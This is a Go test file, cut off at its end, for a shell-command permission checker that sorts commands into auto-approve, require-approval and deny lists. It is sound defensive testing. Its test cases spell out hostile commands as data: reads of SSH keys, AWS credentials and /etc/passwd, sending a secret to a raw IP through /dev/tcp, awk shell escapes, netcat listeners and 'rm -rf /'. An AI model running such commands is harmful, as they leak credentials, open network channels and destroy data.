package common

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestMergeCommandPermissions(t *testing.T) {
	t.Run("empty configs returns empty result", func(t *testing.T) {
		result := MergeCommandPermissions()
		assert.Empty(t, result.AutoApprove)
		assert.Empty(t, result.RequireApproval)
		assert.Empty(t, result.Deny)
	})

	t.Run("single config returns same config", func(t *testing.T) {
		cfg := CommandPermissionConfig{
			AutoApprove:     []CommandPattern{{Pattern: "ls"}},
			RequireApproval: []CommandPattern{{Pattern: "git push"}},
			Deny:            []CommandPattern{{Pattern: "rm -rf /", Message: "dangerous"}},
		}

		result := MergeCommandPermissions(cfg)

		assert.Equal(t, cfg.AutoApprove, result.AutoApprove)
		assert.Equal(t, cfg.RequireApproval, result.RequireApproval)
		assert.Equal(t, cfg.Deny, result.Deny)
	})

	t.Run("basic appending behavior", func(t *testing.T) {
		base := CommandPermissionConfig{
			AutoApprove:     []CommandPattern{{Pattern: "ls"}, {Pattern: "cat"}},
			RequireApproval: []CommandPattern{{Pattern: "git push"}},
			Deny:            []CommandPattern{{Pattern: "sudo", Message: "no sudo"}},
		}
		local := CommandPermissionConfig{
			AutoApprove:     []CommandPattern{{Pattern: "echo"}},
			RequireApproval: []CommandPattern{{Pattern: "npm publish"}},
			Deny:            []CommandPattern{{Pattern: "rm -rf /", Message: "dangerous"}},
		}

		result := MergeCommandPermissions(base, local)

		assert.Len(t, result.AutoApprove, 3)
		assert.Equal(t, "ls", result.AutoApprove[0].Pattern)
		assert.Equal(t, "cat", result.AutoApprove[1].Pattern)
		assert.Equal(t, "echo", result.AutoApprove[2].Pattern)

		assert.Len(t, result.RequireApproval, 2)
		assert.Equal(t, "git push", result.RequireApproval[0].Pattern)
		assert.Equal(t, "npm publish", result.RequireApproval[1].Pattern)

		assert.Len(t, result.Deny, 2)
		assert.Equal(t, "sudo", result.Deny[0].Pattern)
		assert.Equal(t, "rm -rf /", result.Deny[1].Pattern)
	})

	t.Run("reset auto-approve clears previous entries", func(t *testing.T) {
		base := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "ls"}, {Pattern: "cat"}},
		}
		local := CommandPermissionConfig{
			AutoApprove:      []CommandPattern{{Pattern: "echo"}},
			ResetAutoApprove: true,
		}

		result := MergeCommandPermissions(base, local)

		assert.Len(t, result.AutoApprove, 1)
		assert.Equal(t, "echo", result.AutoApprove[0].Pattern)
	})

	t.Run("reset require-approval clears previous entries", func(t *testing.T) {
		base := CommandPermissionConfig{
			RequireApproval: []CommandPattern{{Pattern: "git push"}, {Pattern: "npm publish"}},
		}
		local := CommandPermissionConfig{
			RequireApproval:      []CommandPattern{{Pattern: "docker push"}},
			ResetRequireApproval: true,
		}

		result := MergeCommandPermissions(base, local)

		assert.Len(t, result.RequireApproval, 1)
		assert.Equal(t, "docker push", result.RequireApproval[0].Pattern)
	})

	t.Run("deny always accumulates regardless of reset flags", func(t *testing.T) {
		base := CommandPermissionConfig{
			Deny: []CommandPattern{{Pattern: "sudo", Message: "no sudo"}},
		}
		local := CommandPermissionConfig{
			Deny:                 []CommandPattern{{Pattern: "rm -rf /", Message: "dangerous"}},
			ResetAutoApprove:     true,
			ResetRequireApproval: true,
		}

		result := MergeCommandPermissions(base, local)

		assert.Len(t, result.Deny, 2)
		assert.Equal(t, "sudo", result.Deny[0].Pattern)
		assert.Equal(t, "rm -rf /", result.Deny[1].Pattern)
	})

	t.Run("multiple configs merge in order", func(t *testing.T) {
		base := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "ls"}},
			Deny:        []CommandPattern{{Pattern: "sudo"}},
		}
		local := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "cat"}},
			Deny:        []CommandPattern{{Pattern: "rm -rf /"}},
		}
		repo := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "go test"}},
			Deny:        []CommandPattern{{Pattern: "chmod 777"}},
		}
		workspace := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "npm test"}},
			Deny:        []CommandPattern{{Pattern: "mkfs"}},
		}

		result := MergeCommandPermissions(base, local, repo, workspace)

		assert.Len(t, result.AutoApprove, 4)
		assert.Equal(t, "ls", result.AutoApprove[0].Pattern)
		assert.Equal(t, "cat", result.AutoApprove[1].Pattern)
		assert.Equal(t, "go test", result.AutoApprove[2].Pattern)
		assert.Equal(t, "npm test", result.AutoApprove[3].Pattern)

		assert.Len(t, result.Deny, 4)
		assert.Equal(t, "sudo", result.Deny[0].Pattern)
		assert.Equal(t, "rm -rf /", result.Deny[1].Pattern)
		assert.Equal(t, "chmod 777", result.Deny[2].Pattern)
		assert.Equal(t, "mkfs", result.Deny[3].Pattern)
	})

	t.Run("reset in middle config clears only previous entries", func(t *testing.T) {
		base := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "ls"}},
		}
		local := CommandPermissionConfig{
			AutoApprove:      []CommandPattern{{Pattern: "cat"}},
			ResetAutoApprove: true,
		}
		repo := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "go test"}},
		}

		result := MergeCommandPermissions(base, local, repo)

		assert.Len(t, result.AutoApprove, 2)
		assert.Equal(t, "cat", result.AutoApprove[0].Pattern)
		assert.Equal(t, "go test", result.AutoApprove[1].Pattern)
	})

	t.Run("empty config in chain is handled correctly", func(t *testing.T) {
		base := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "ls"}},
			Deny:        []CommandPattern{{Pattern: "sudo"}},
		}
		empty := CommandPermissionConfig{}
		repo := CommandPermissionConfig{
			AutoApprove: []CommandPattern{{Pattern: "go test"}},
		}

		result := MergeCommandPermissions(base, empty, repo)

		assert.Len(t, result.AutoApprove, 2)
		assert.Equal(t, "ls", result.AutoApprove[0].Pattern)
		assert.Equal(t, "go test", result.AutoApprove[1].Pattern)

		assert.Len(t, result.Deny, 1)
		assert.Equal(t, "sudo", result.Deny[0].Pattern)
	})

	t.Run("reset with empty list clears all previous", func(t *testing.T) {
		base := CommandPermissionConfig{
			AutoApprove:     []CommandPattern{{Pattern: "ls"}, {Pattern: "cat"}},
			RequireApproval: []CommandPattern{{Pattern: "git push"}},
		}
		local := CommandPermissionConfig{
			ResetAutoApprove:     true,
			ResetRequireApproval: true,
		}

		result := MergeCommandPermissions(base, local)

		assert.Empty(t, result.AutoApprove)
		assert.Empty(t, result.RequireApproval)
	})

	t.Run("message field is preserved", func(t *testing.T) {
		base := CommandPermissionConfig{
			Deny: []CommandPattern{{Pattern: "sudo", Message: "no sudo allowed"}},
		}
		local := CommandPermissionConfig{
			Deny: []CommandPattern{{Pattern: "rm -rf /", Message: "dangerous operation"}},
		}

		result := MergeCommandPermissions(base, local)

		assert.Len(t, result.Deny, 2)
		assert.Equal(t, "no sudo allowed", result.Deny[0].Message)
		assert.Equal(t, "dangerous operation", result.Deny[1].Message)
	})
}

func TestMatchPattern(t *testing.T) {
	tests := []struct {
		name          string
		pattern       string
		command       string
		expectMatch   bool
		expectMatches []string
	}{
		{
			name:          "exact prefix match",
			pattern:       "ls",
			command:       "ls -la",
			expectMatch:   true,
			expectMatches: []string{"ls"},
		},
		{
			name:          "exact prefix match with full command",
			pattern:       "git status",
			command:       "git status --short",
			expectMatch:   true,
			expectMatches: []string{"git status"},
		},
		{
			name:        "prefix no match",
			pattern:     "cat",
			command:     "ls -la",
			expectMatch: false,
		},
		{
			name:          "regex pattern with dot",
			pattern:       "rm.*-rf",
			command:       "rm -rf /tmp",
			expectMatch:   true,
			expectMatches: []string{"rm -rf"},
		},
		{
			name:          "regex pattern with capture group",
			pattern:       `rm -rf (.+)`,
			command:       "rm -rf /home/user",
			expectMatch:   true,
			expectMatches: []string{"rm -rf /home/user", "/home/user"},
		},
		{
			name:        "regex no match",
			pattern:     "^sudo.*",
			command:     "ls -la",
			expectMatch: false,
		},
		{
			name:          "pattern already anchored",
			pattern:       "^git push",
			command:       "git push origin main",
			expectMatch:   true,
			expectMatches: []string{"git push"},
		},
		{
			name:        "invalid regex returns no match",
			pattern:     "[invalid",
			command:     "anything",
			expectMatch: false,
		},
		{
			name:          "pattern with pipe metachar",
			pattern:       "cat|dog",
			command:       "cat file.txt",
			expectMatch:   true,
			expectMatches: []string{"cat"},
		},
		{
			name:          "pattern with question mark",
			pattern:       "tests?",
			command:       "test foo",
			expectMatch:   true,
			expectMatches: []string{"test"},
		},
		{
			name:          "pattern with plus",
			pattern:       "go+gle",
			command:       "google search",
			expectMatch:   true,
			expectMatches: []string{"google"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matched, matches := matchPattern(tt.pattern, tt.command)
			assert.Equal(t, tt.expectMatch, matched)
			if tt.expectMatch {
				assert.Equal(t, tt.expectMatches, matches)
			}
		})
	}
}

func TestInterpolateMessage(t *testing.T) {
	tests := []struct {
		name     string
		message  string
		matches  []string
		expected string
	}{
		{
			name:     "no placeholders",
			message:  "This is a simple message",
			matches:  []string{"match"},
			expected: "This is a simple message",
		},
		{
			name:     "single placeholder $0",
			message:  "Command '$0' is not allowed",
			matches:  []string{"sudo rm"},
			expected: "Command 'sudo rm' is not allowed",
		},
		{
			name:     "multiple placeholders",
			message:  "Cannot run $0, specifically $1",
			matches:  []string{"rm -rf /home", "/home"},
			expected: "Cannot run rm -rf /home, specifically /home",
		},
		{
			name:     "empty matches",
			message:  "Message with $0",
			matches:  []string{},
			expected: "Message with $0",
		},
		{
			name:     "placeholder not in matches",
			message:  "Value: $5",
			matches:  []string{"a", "b"},
			expected: "Value: $5",
		},
		{
			name:     "multiple occurrences of same placeholder",
			message:  "$0 and $0 again",
			matches:  []string{"test"},
			expected: "test and test again",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := interpolateMessage(tt.message, tt.matches)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestEvaluateCommandPermission(t *testing.T) {
	config := CommandPermissionConfig{
		AutoApprove: []CommandPattern{
			{Pattern: "ls"},
			{Pattern: "cat"},
			{Pattern: "git status"},
			{Pattern: "go test"},
		},
		RequireApproval: []CommandPattern{
			{Pattern: "git push"},
			{Pattern: "npm publish"},
		},
		Deny: []CommandPattern{
			{Pattern: "sudo", Message: "sudo commands require manual execution"},
			{Pattern: "rm -rf /", Message: "Cannot delete root directory"},
			{Pattern: `rmdir --recursive (.+)`, Message: "Cannot recursively delete $1"},
		},
	}

	tests := []struct {
		name           string
		command        string
		expectedResult PermissionResult
		expectedMsg    string
	}{
		{
			name:           "auto-approve exact match",
			command:        "ls",
			expectedResult: PermissionAutoApprove,
			expectedMsg:    "",
		},
		{
			name:           "auto-approve prefix match with absolute path requires approval",
			command:        "ls -la /tmp",
			expectedResult: PermissionRequireApproval,
			expectedMsg:    "",
		},
		{
			name:           "auto-approve multi-word pattern",
			command:        "git status --short",
			expectedResult: PermissionAutoApprove,
			expectedMsg:    "",
		},
		{
			name:           "require-approval match",
			command:        "git push origin main",
			expectedResult: PermissionRequireApproval,
			expectedMsg:    "",
		},
		{
			name:           "deny match with message",
			command:        "sudo apt-get install",
			expectedResult: PermissionDeny,
			expectedMsg:    "sudo commands require manual execution",
		},
		{
			name:           "deny match with interpolation",
			command:        "rmdir --recursive /home/user",
			expectedResult: PermissionDeny,
			expectedMsg:    "Cannot recursively delete /home/user",
		},
		{
			name:           "unknown command defaults to require-approval",
			command:        "some-unknown-command",
			expectedResult: PermissionRequireApproval,
			expectedMsg:    "",
		},
		{
			name:           "deny takes precedence over auto-approve",
			command:        "sudo ls",
			expectedResult: PermissionDeny,
			expectedMsg:    "sudo commands require manual execution",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, msg := EvaluateCommandPermission(config, tt.command)
			assert.Equal(t, tt.expectedResult, result)
			assert.Equal(t, tt.expectedMsg, msg)
		})
	}
}

func TestContainsAbsolutePath(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "no absolute path",
			command:  "ls -la",
			expected: false,
		},
		{
			name:     "relative path",
			command:  "cat ./foo/bar.txt",
			expected: false,
		},
		{
			name:     "absolute path argument",
			command:  "cat /etc/passwd",
			expected: true,
		},
		{
			name:     "absolute path in middle",
			command:  "cp /etc/passwd /tmp/passwd",
			expected: true,
		},
		{
			name:     "safe path /dev/null",
			command:  "echo hello > /dev/null",
			expected: false,
		},
		{
			name:     "safe path /dev/stdin",
			command:  "cat /dev/stdin",
			expected: false,
		},
		{
			name:     "safe path /dev/stdout",
			command:  "echo hello > /dev/stdout",
			expected: false,
		},
		{
			name:     "safe path /dev/stderr",
			command:  "echo error > /dev/stderr",
			expected: false,
		},
		{
			name:     "absolute path in quotes",
			command:  `cat "/etc/passwd"`,
			expected: true,
		},
		{
			name:     "absolute path in single quotes",
			command:  `cat '/etc/passwd'`,
			expected: true,
		},
		{
			name:     "path with spaces in quotes",
			command:  `cat "/path/with spaces/file.txt"`,
			expected: true,
		},
		{
			name:     "command starting with absolute path",
			command:  "/usr/bin/ls -la",
			expected: true,
		},
		{
			name:     "piped command with absolute path",
			command:  "cat /etc/passwd | grep root",
			expected: true,
		},
		{
			name:     "command with flag looking like path",
			command:  "ls --color=auto",
			expected: false,
		},
		{
			name:     "flag with absolute path value",
			command:  "myapp --config=/etc/myapp/config.yaml",
			expected: true,
		},
		{
			name:     "flag with absolute path using equals",
			command:  "tar -xf archive.tar --directory=/tmp/extract",
			expected: true,
		},
		{
			name:     "path with trailing slash",
			command:  "ls /etc/",
			expected: true,
		},
		{
			name:     "path with glob pattern",
			command:  "ls /var/log/*.log",
			expected: true,
		},
		{
			name:     "colon-separated paths",
			command:  "export PATH=/usr/local/bin:/usr/bin",
			expected: true,
		},
		{
			name:     "awk regex pattern detected as path",
			command:  "awk '/pattern/ {print}' file.txt",
			expected: true,
		},
		{
			name:     "sed regex not a path",
			command:  "sed 's/foo/bar/g' file.txt",
			expected: false,
		},
		{
			name:     "path with shell variable",
			command:  "cat /etc/$FILE",
			expected: true,
		},
		{
			name:     "path with shell variable in braces",
			command:  "cat /tmp/${dir}/file.txt",
			expected: true,
		},
		{
			name:     "path with command substitution",
			command:  "cat /tmp/$(whoami)/file.txt",
			expected: true,
		},
		{
			name:     "PATH assignment before command",
			command:  "PATH=$PATH:/some/path ls",
			expected: true,
		},
		{
			name:     "URL with http scheme not a path",
			command:  "curl http://localhost:3000/some/path",
			expected: false,
		},
		{
			name:     "URL with http scheme in quotes not a path",
			command:  `curl "http://localhost:3000/some/path"`,
			expected: false,
		},
		{
			name:     "URL without scheme not a path",
			command:  "curl localhost:3000/some/path",
			expected: false,
		},
		{
			name:     "path with trailing slash data",
			command:  "ls /data/",
			expected: true,
		},
		{
			name:     "path with trailing slash workspace",
			command:  "ls /workspace/",
			expected: true,
		},
		{
			name:     "path with trailing slash custom dir",
			command:  "ls /mydir/",
			expected: true,
		},
		{
			name:     "sed substitution not a path",
			command:  "sed 's/old/new/g' file.txt",
			expected: false,
		},
		{
			name:     "sed delete pattern not a path",
			command:  "sed '/pattern/d' file.txt",
			expected: false,
		},
		{
			name:     "sed print pattern not a path",
			command:  "sed -n '/pattern/p' file.txt",
			expected: false,
		},
		{
			name:     "sed in-place substitution not a path",
			command:  "sed -i 's/old/new/g' file.txt",
			expected: false,
		},
		{
			name:     "sed with absolute path file argument",
			command:  "sed 's/foo/bar/g' /etc/passwd",
			expected: true,
		},
		{
			name:     "sed in-place with absolute path",
			command:  "sed -i 's/old/new/g' /etc/config",
			expected: true,
		},
		{
			name:     "perl pie substitution not a path",
			command:  "perl -pi -e 's/foo/bar/g' file.txt",
			expected: false,
		},
		{
			name:     "perl pe substitution not a path",
			command:  "perl -pe 's/foo/bar/g' file.txt",
			expected: false,
		},
		{
			name:     "perl pie with absolute path file",
			command:  "perl -pi -e 's/foo/bar/g' /etc/passwd",
			expected: true,
		},
		{
			name:     "grep regex not a path",
			command:  "grep '/^test/' file.txt",
			expected: false,
		},
		{
			name:     "awk pattern with absolute path file still detected",
			command:  "awk '/pattern/ {print}' /etc/passwd",
			expected: true,
		},
		{
			name:     "awk with absolute path still detected",
			command:  "awk -F: '{print $1}' /etc/passwd",
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := containsAbsolutePath(tt.command)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestEvaluateCommandPermission_AbsolutePaths(t *testing.T) {
	config := CommandPermissionConfig{
		AutoApprove: []CommandPattern{
			{Pattern: "ls"},
			{Pattern: "cat"},
			{Pattern: "echo"},
			{Pattern: "cp"},
			{Pattern: "tar"},
			{Pattern: "myapp"},
			{Pattern: "export"},
			{Pattern: "curl"},
			{Pattern: "sed"},
			{Pattern: "perl"},
		},
	}

	tests := []struct {
		name           string
		command        string
		expectedResult PermissionResult
	}{
		// Basic cases - relative paths auto-approved
		{
			name:           "auto-approve ls with flags only",
			command:        "ls -la",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "auto-approve ls with relative path",
			command:        "ls ./mydir",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval ls with absolute path",
			command:        "ls /etc",
			expectedResult: PermissionRequireApproval,
		},
		{
			name:           "require approval ls with absolute path trailing slash",
			command:        "ls /etc/",
			expectedResult: PermissionRequireApproval,
		},
		// cat command
		{
			name:           "auto-approve cat with relative path",
			command:        "cat ./file.txt",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval cat with absolute path",
			command:        "cat /etc/passwd",
			expectedResult: PermissionRequireApproval,
		},
		// Safe /dev paths remain auto-approved
		{
			name:           "auto-approve echo with safe /dev/null",
			command:        "echo hello > /dev/null",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "auto-approve cat /dev/stdin",
			command:        "cat /dev/stdin",
			expectedResult: PermissionAutoApprove,
		},
		// cp command
		{
			name:           "auto-approve cp with relative paths",
			command:        "cp ./src.txt ./dest.txt",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval cp with absolute source",
			command:        "cp /etc/passwd ./local.txt",
			expectedResult: PermissionRequireApproval,
		},
		{
			name:           "require approval cp with absolute dest",
			command:        "cp ./local.txt /tmp/dest.txt",
			expectedResult: PermissionRequireApproval,
		},
		// Flag-style paths
		{
			name:           "auto-approve tar with relative directory",
			command:        "tar -xf archive.tar --directory=./extract",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval tar with absolute directory flag",
			command:        "tar -xf archive.tar --directory=/tmp/extract",
			expectedResult: PermissionRequireApproval,
		},
		{
			name:           "auto-approve myapp with relative config",
			command:        "myapp --config=./config.yaml",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval myapp with absolute config flag",
			command:        "myapp --config=/etc/myapp/config.yaml",
			expectedResult: PermissionRequireApproval,
		},
		// Glob patterns
		{
			name:           "auto-approve ls with relative glob",
			command:        "ls ./*.log",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval ls with absolute glob",
			command:        "ls /var/log/*.log",
			expectedResult: PermissionRequireApproval,
		},
		// Colon-separated paths (like PATH exports)
		{
			name:           "auto-approve export with relative paths",
			command:        "export PATH=./bin:../lib",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval export with absolute paths",
			command:        "export PATH=/usr/local/bin:/usr/bin",
			expectedResult: PermissionRequireApproval,
		},
		// Custom directory paths with trailing slash (regression test for /data/ etc)
		{
			name:           "require approval ls with /data/ path",
			command:        "ls /data/",
			expectedResult: PermissionRequireApproval,
		},
		{
			name:           "require approval ls with /workspace/ path",
			command:        "ls /workspace/",
			expectedResult: PermissionRequireApproval,
		},
		{
			name:           "require approval cat with /data/file.txt",
			command:        "cat /data/file.txt",
			expectedResult: PermissionRequireApproval,
		},
		// URLs should not trigger absolute path detection
		{
			name:           "auto-approve curl with http URL",
			command:        "curl http://localhost:3000/some/path",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "auto-approve curl with quoted http URL",
			command:        `curl "http://localhost:3000/some/path"`,
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "auto-approve curl with localhost URL without scheme",
			command:        "curl localhost:3000/some/path",
			expectedResult: PermissionAutoApprove,
		},
		// sed regex patterns should be auto-approved when file args are relative
		{
			name:           "auto-approve sed substitution with relative file",
			command:        "sed 's/foo/bar/g' file.txt",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "auto-approve sed delete pattern with relative file",
			command:        "sed '/pattern/d' file.txt",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "auto-approve sed print pattern with relative file",
			command:        "sed -n '/pattern/p' file.txt",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "auto-approve sed in-place with relative file",
			command:        "sed -i 's/old/new/g' file.txt",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval sed with absolute path file",
			command:        "sed 's/foo/bar/g' /etc/passwd",
			expectedResult: PermissionRequireApproval,
		},
		{
			name:           "require approval sed in-place with absolute path",
			command:        "sed -i 's/old/new/g' /etc/config",
			expectedResult: PermissionRequireApproval,
		},
		// perl -pi -e and -pe patterns should be auto-approved when file args are relative
		{
			name:           "auto-approve perl pie with relative file",
			command:        "perl -pi -e 's/foo/bar/g' file.txt",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "auto-approve perl pe with relative file",
			command:        "perl -pe 's/foo/bar/g' file.txt",
			expectedResult: PermissionAutoApprove,
		},
		{
			name:           "require approval perl pie with absolute path file",
			command:        "perl -pi -e 's/foo/bar/g' /etc/passwd",
			expectedResult: PermissionRequireApproval,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, _ := EvaluateCommandPermission(config, tt.command)
			assert.Equal(t, tt.expectedResult, result)
		})
	}
}

func TestEvaluateCommandPermission_EmptyConfig(t *testing.T) {
	config := CommandPermissionConfig{}

	result, msg := EvaluateCommandPermission(config, "any command")
	assert.Equal(t, PermissionRequireApproval, result)
	assert.Empty(t, msg)
}

func TestEvaluateCommandPermission_DenyPrecedence(t *testing.T) {
	config := CommandPermissionConfig{
		AutoApprove: []CommandPattern{
			{Pattern: "rm"},
		},
		Deny: []CommandPattern{
			{Pattern: "rm -rf", Message: "dangerous"},
		},
	}

	// "rm" alone should be auto-approved
	result, _ := EvaluateCommandPermission(config, "rm file.txt")
	assert.Equal(t, PermissionAutoApprove, result)

	// "rm -rf" should be denied even though "rm" is auto-approved
	result, msg := EvaluateCommandPermission(config, "rm -rf /tmp")
	assert.Equal(t, PermissionDeny, result)
	assert.Equal(t, "dangerous", msg)
}

func TestEvaluateScriptPermission(t *testing.T) {
	config := CommandPermissionConfig{
		AutoApprove: []CommandPattern{
			{Pattern: "ls"},
			{Pattern: "cat"},
			{Pattern: "echo"},
		},
		RequireApproval: []CommandPattern{
			{Pattern: "git push"},
		},
		Deny: []CommandPattern{
			{Pattern: "sudo", Message: "no sudo allowed"},
		},
	}

	tests := []struct {
		name           string
		script         string
		expectedResult PermissionResult
		expectedMsg    string
	}{
		{
			name:           "all commands auto-approved",
			script:         "ls -la && cat file.txt",
			expectedResult: PermissionAutoApprove,
			expectedMsg:    "",
		},
		{
			name:           "single auto-approved command",
			script:         "echo hello",
			expectedResult: PermissionAutoApprove,
			expectedMsg:    "",
		},
		{
			name:           "one command requires approval",
			script:         "ls -la && git push origin main",
			expectedResult: PermissionRequireApproval,
			expectedMsg:    "",
		},
		{
			name:           "one command denied",
			script:         "ls -la && sudo apt-get update",
			expectedResult: PermissionDeny,
			expectedMsg:    "no sudo allowed",
		},
		{
			name:           "denied command stops evaluation",
			script:         "sudo rm -rf / && ls",
			expectedResult: PermissionDeny,
			expectedMsg:    "no sudo allowed",
		},
		{
			name:           "unknown command requires approval",
			script:         "ls && unknown-command",
			expectedResult: PermissionRequireApproval,
			expectedMsg:    "",
		},
		{
			name:           "empty script requires approval",
			script:         "",
			expectedResult: PermissionRequireApproval,
			expectedMsg:    "",
		},
		{
			name:           "piped commands",
			script:         "cat file.txt | grep pattern",
			expectedResult: PermissionRequireApproval,
			expectedMsg:    "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, msg := EvaluateScriptPermission(config, tt.script)
			assert.Equal(t, tt.expectedResult, result, "unexpected result for script: %s", tt.script)
			assert.Equal(t, tt.expectedMsg, msg)
		})
	}
}

func TestEvaluateScriptPermission_WithBasePermissions(t *testing.T) {
	config := BaseCommandPermissions()

	t.Run("common safe commands are auto-approved", func(t *testing.T) {
		safeScripts := []string{
			"ls -la",
			"cat README.md",
			"git status",
			"git log --oneline",
			"go test ./...",
			"pwd",
			"cd worker/replay && cat replay_test_data.json | head -50",
		}

		for _, script := range safeScripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionAutoApprove, result, "expected auto-approve for: %s", script)
		}
	})

	t.Run("dangerous commands are denied", func(t *testing.T) {
		dangerousScripts := []string{
			"sudo apt-get install",
			"rm -rf /",
			"chmod 777 /etc",
		}

		for _, script := range dangerousScripts {
			result, msg := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionDeny, result, "expected deny for: %s", script)
			require.NotEmpty(t, msg, "expected message for denied command: %s", script)
		}
	})

	t.Run("sensitive commands require approval", func(t *testing.T) {
		sensitiveScripts := []string{
			"env",
			"printenv",
			"curl https://example.com",
			"wget http://example.com/file",
			"cat .env",
			"cat .envrc",
			"source .env",
			"grep password .env",
		}

		for _, script := range sensitiveScripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
		}
	})

	t.Run("require-approval takes precedence over user auto-approve", func(t *testing.T) {
		// Simulate a user config that tries to auto-approve curl
		userConfig := CommandPermissionConfig{
			AutoApprove: []CommandPattern{
				{Pattern: "curl"},
			},
		}
		mergedConfig := MergeCommandPermissions(BaseCommandPermissions(), userConfig)

		// curl should still require approval because base RequireApproval takes precedence
		result, _ := EvaluateCommandPermission(mergedConfig, "curl https://example.com")
		assert.Equal(t, PermissionRequireApproval, result, "require-approval should take precedence over auto-approve")
	})

	t.Run("plain awk without absolute paths remains auto-approved", func(t *testing.T) {
		safeAwkScripts := []string{
			"awk '{print $1}' file.txt",
			"awk 'NR==1' file.txt",
		}

		for _, script := range safeAwkScripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionAutoApprove, result, "expected auto-approve for: %s", script)
		}
	})

	t.Run("awk with regex pattern requires approval", func(t *testing.T) {
		// awk regex patterns like /pattern/ are detected as potential paths
		// since we can't reliably distinguish them without a full awk parser
		awkWithRegex := []string{
			"awk '/pattern/ {print}' file.txt",
		}

		for _, script := range awkWithRegex {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
		}
	})

	t.Run("awk with absolute paths requires approval", func(t *testing.T) {
		awkWithAbsolutePaths := []string{
			"awk -F: '{print $1}' /etc/passwd",
		}

		for _, script := range awkWithAbsolutePaths {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
		}
	})

	t.Run("dangerous awk commands require approval", func(t *testing.T) {
		dangerousAwkScripts := []string{
			`awk 'BEGIN {system("cat /etc/passwd")}'`,
			`awk '{cmd | getline result}'`,
			`awk '{"date" |getline d}'`,
			`awk 'BEGIN {print "test" | "sh"}'`,
			`awk 'BEGIN {printf "test" | "sh"}'`,
			`awk 'BEGIN {print |& "sh"}'`,
			`awk 'BEGIN { s = "/inet/tcp/0/example.com/80" }'`,
		}

		for _, script := range dangerousAwkScripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
		}
	})

	t.Run("home directory access requires approval", func(t *testing.T) {
		homeAccessScripts := []string{
			"cat ~/.ssh/id_rsa",
			"cat $HOME/.aws/credentials",
			"cat ${HOME}/.bashrc",
			"ls ~/",
			"grep secret $HOME/.env",
			"cat ~root/.ssh/id_rsa",
			"ls ~root",
			"cat ~user/file",
		}

		for _, script := range homeAccessScripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
		}
	})

	t.Run("parent directory traversal requires approval", func(t *testing.T) {
		traversalScripts := []string{
			"cat ../../../etc/passwd",
			"ls ../../secrets",
			"head -n 10 ../other-repo/config.json",
		}

		for _, script := range traversalScripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
		}
	})

	t.Run("network commands require approval", func(t *testing.T) {
		networkScripts := []string{
			"nc -l 8080",
			"netcat example.com 80",
			"ncat --listen 443",
			"socat TCP-LISTEN:8080 -",
			"telnet example.com 23",
			"ftp ftp.example.com",
			"sftp user@example.com",
			"scp file.txt user@host:/path",
			"rsync -avz . remote:/backup",
			"ssh user@example.com",
			"ping example.com",
			"nslookup example.com",
			"dig example.com",
			"host example.com",
		}

		for _, script := range networkScripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
		}
	})
}

func TestBasePermissions_ExfiltrationPatterns(t *testing.T) {
	config := BaseCommandPermissions()

	t.Run("TCP/UDP redirection requires approval", func(t *testing.T) {
		scripts := []string{
			"echo secret >/dev/tcp/1.2.3.4/80",
			"exec 3<>/dev/udp/1.2.3.4/53",
		}

		for _, script := range scripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
		}
	})

	t.Run("plain sed is auto-approved", func(t *testing.T) {
